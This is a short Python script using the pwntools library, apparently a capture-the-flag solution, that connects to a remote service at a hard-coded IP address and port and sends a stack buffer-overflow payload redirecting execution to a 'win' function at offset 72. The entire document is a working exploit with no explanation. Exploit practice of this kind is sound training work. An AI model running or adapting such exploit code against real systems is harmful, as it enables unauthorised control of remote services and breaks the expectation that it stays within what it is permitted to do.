#!/usr/bin/env python3
from pwn import *

win = 0x4011fd
context.arch = "amd64"

io = remote('104.154.225.240', 1337)

payload = fit({72: win})
io.sendafter(b"name: ", payload)
print(io.recv())